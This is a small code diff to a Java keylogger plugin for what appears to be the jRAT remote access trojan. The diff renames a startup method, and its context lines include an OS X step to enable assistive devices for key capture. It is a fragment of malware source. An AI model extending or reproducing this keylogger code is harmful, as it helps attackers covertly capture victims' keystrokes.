@@ -33,10 +33,6 @@ public class KeyloggerPlugin extends jrat.api.stub.StubPlugin {
 	public static final short LOGS_HEADER = 124;
 	public static final short LOG_HEADER = 125;
 	
-	public void onEnable() throws Exception {
-
-	}
-
 	public void onDisconnect(Exception ex) {
 
 	}
@@ -139,7 +135,7 @@ public class KeyloggerPlugin extends jrat.api.stub.StubPlugin {
 	}
 
 	@Override
-	public void onStart() throws Exception {
+	public void onEnable() throws Exception {
 		try {
 			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
 				System.out.println("Trying to enable assistive devices... Even if enabled");
